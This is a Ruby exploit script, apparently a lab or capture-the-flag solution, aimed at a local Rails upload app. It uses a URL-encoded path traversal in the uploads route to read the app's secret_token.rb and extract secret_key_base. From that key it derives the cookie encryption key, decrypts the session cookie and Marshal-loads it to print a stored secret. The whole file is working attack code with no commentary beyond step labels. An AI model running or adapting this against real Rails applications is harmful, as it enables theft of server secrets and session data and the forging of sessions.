#! /usr/bin/env ruby

require 'net/http'
require 'base64'
require 'openssl'

# Get /config/initializers/secret_token.rb and parse the secret_key_base out of it
response = Net::HTTP.get_response(URI('http://localhost:3000/uploads/%2E%2E%2Fconfig%2Finitializers%2Fsecret_token.rb'))
secret_key_base = response.body.split('secret_key_base = ')[1].strip.gsub("'", '')

# Figure out the encryption key based on the secret_key_base
salt       = 'encrypted cookie'
iterations = 1000
key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, salt, iterations, 64)

# Get encrypted session data and iv
response = Net::HTTP.get_response(URI('http://localhost:3000'))
encoded_session_data = response['set-cookie'].match(/\A_ultimate-uploader_session=(.*)--.*\Z/).captures.first
encoded_session_data.gsub!('%3D', '=')
session_data = Base64.decode64(encoded_session_data)

encoded_ciphertext, encoded_iv = session_data.split('--')
ciphertext, iv = Base64.decode64(encoded_ciphertext), Base64.decode64(encoded_iv)


# Decrypt the session data
plaintext = ''
OpenSSL::Cipher::Cipher.new('aes-256-cbc').tap do |c|
  c.decrypt
  c.key = key
  c.iv  = iv

  plaintext = c.update(ciphertext)
  plaintext << c.final
end

# Unserialize the session data and extract the secret
puts Marshal.load(plaintext)['secret']
